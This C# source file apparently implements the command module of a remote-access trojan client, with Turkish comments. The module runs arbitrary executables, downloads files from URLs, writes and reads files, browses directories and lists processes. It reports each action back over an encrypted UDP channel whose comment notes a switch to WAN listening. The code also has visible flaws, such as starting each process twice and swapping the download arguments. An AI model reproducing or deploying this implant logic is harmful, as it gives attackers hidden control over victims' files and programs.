using NPOI.SS.Formula.Functions;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Client.Shelter;
using System.Net.Sockets;
using Client.Data;

namespace Client.Shelter
{
    class GhostOperator : Shelter
    {

        public static void ComradeShip(string comrade)
        {
            //Socket oluşturma ve lokal bazlı dinleme için gerekli tanımlamalar
            //ipv6 kullanılıyor
            Socket socket = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            socket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14567); // lokal bazlı dinleme için 127.0.0.1, WAN bazlı dinleme için 0.0.0.0
            Byte[] data = Encoding.ASCII.GetBytes(comrade.Ghoster()); // Aes ile şifreli bir şekilde komut gönderimi
            socket.SendTo(data, iPEndPoint);
        }
        public GhostOperator(string name) : base(name) { }
        // Dosya çalıştırma, clienta dosya gönderme, clienttan dosya çekme, dizin görüntüleme ve gezinme işlemleri
        public override string exc(string[] args)
        {
            
            // args ile gelen metin şekli örneği run C:\some\where\file.exe
            // "run" metni args[0] iken "C:\some\where\file.exe" args[1] dir, dolayısıyla run create view gibi işlemlerde
            //args[1] baz alınacaktır.Download Write gibi işlemlerde için örnek bir girdi üzerinden açıklayacak olursak
            //download http://some/file/url C:\some\where\test.ps1 örneği üzeirnden açıklama yapalım
            // download args[0] iken url [args1] dizin yolu [args2] dir, işlemler bu doğrultuda gerçekleşmektedir
            if (args.Length == 0)
            {
                return "Expected argument for ghost";
            }
            switch (args.First())
            {
                case "run":
                    if (args.Length != 2)
                    {
                        return "Expected 2 arguments for file run";
                    }
                    return this.RunningShelter(args[1]);
                   


                case "download":
                    if (args.Length != 3)
                    {
                        return "Expected 3 arguments for file download";
                    }
                   return  this.Download(args[1],args[2]);
                   

                case "create":
                    if (args.Length != 2)
                    {
                        return "Expected 2 arguments for file create";
                    }
                    return this.Create(args[1]);
                    

                case "write":
                    if (args.Length != 3)
                    {
                        return "Expected 3 arguments for file write";
                    }
                    return this.Write(args[1], args[2]);
                  

                case "view":
                    if (args.Length != 2)
                    {
                        return "Expected 2 arguments for file view";
                    }
                    return this.View(args[1]);

                case "pwd":
                    if (args.Length != 1)
                    {
                        return "Expected 1 arguments for directory listing";
                    }

                    return this.GetCurrentDirectory();

                case "cd":
                    if (args.Length != 2)
                    {
                        return "Expected 1 arguments for directory listing";
                    }

                    return this.ChangeDirectory(args[1]);

                case "ls":
                    if (args.Length != 2)
                    {
                        return "Expected 2 arguments for directory listing";
                    }

                    return ListDirectory(args[1]);

                case "ps":
                    if (args.Length != 1)
                    {
                        return "Expected 1 arguments for directory listing";
                    }
                    
                    return ProcessList();

             

                default:
                    return "Unexpected argument" + args[0];
                   
            }

        }
        public string ProcessList()
        {
            try
            {
                ComradeShip("Process List \n"+Hosts.GetProcessList().ToString());
                return Hosts.GetProcessList().ToString();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
        
        public string ListDirectory(string Path)
        {
            try
            {
                ComradeShip(string.IsNullOrEmpty(Path.Trim()) ? Host.GetDirectoryListing().ToString() : Host.GetDirectoryListing(Path.Trim()).ToString());
                return string.IsNullOrEmpty(Path.Trim()) ? Host.GetDirectoryListing().ToString() : Host.GetDirectoryListing(Path.Trim()).ToString();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    
        public  string ChangeDirectory(string DirectoryName)
        {
            try
            {
                Directory.SetCurrentDirectory(DirectoryName);
                ComradeShip(Directory.GetCurrentDirectory());
                return Directory.GetCurrentDirectory();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
        public  string GetCurrentDirectory()
        {
            ComradeShip(Directory.GetCurrentDirectory());
            return Directory.GetCurrentDirectory();
        }
        public string RunningShelter(string sh)
        {
            ComradeShip("Started process with id " + Process.Start(sh).Id);
           return "Started process with id "+ Process.Start(sh).Id;
        }
        public string Create(string sh)
        {
            System.IO.File.Create(sh).Close();
            ComradeShip("Created file :  " + sh);
            return "Created file :  " + sh;
        }

        public string Write(string data,string sh)
        {
            System.IO.File.AppendAllText(sh, data);
            ComradeShip("Appended text to file : " + sh);
            return "Appended text to file : " + sh;
        }

        public string Download(string sh,string url)
        {
            using (WebClient wc = new WebClient())
                wc.DownloadFile(url, sh);

            return "Downloaded file :   " + sh;
            
        }
        public string View(string sh)
        {
            return System.IO.File.ReadAllText(sh);
        }
       

       }
}
